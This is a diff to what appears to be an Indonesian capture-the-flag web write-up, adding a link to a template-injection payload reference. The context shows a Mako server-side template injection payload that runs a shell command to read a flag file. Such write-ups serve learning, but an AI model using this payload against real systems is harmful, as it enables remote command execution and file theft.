@@ -14,7 +14,7 @@ tags: [very easy, web]
 
 ## Enumeration
 
-Pokoknya exploitnya SSTI Mako
+Pokoknya exploitnya [SSTI Mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)
 
 ```bash
 ${self.module.runtime.util.os.popen("cat ../flag.txt").read()}
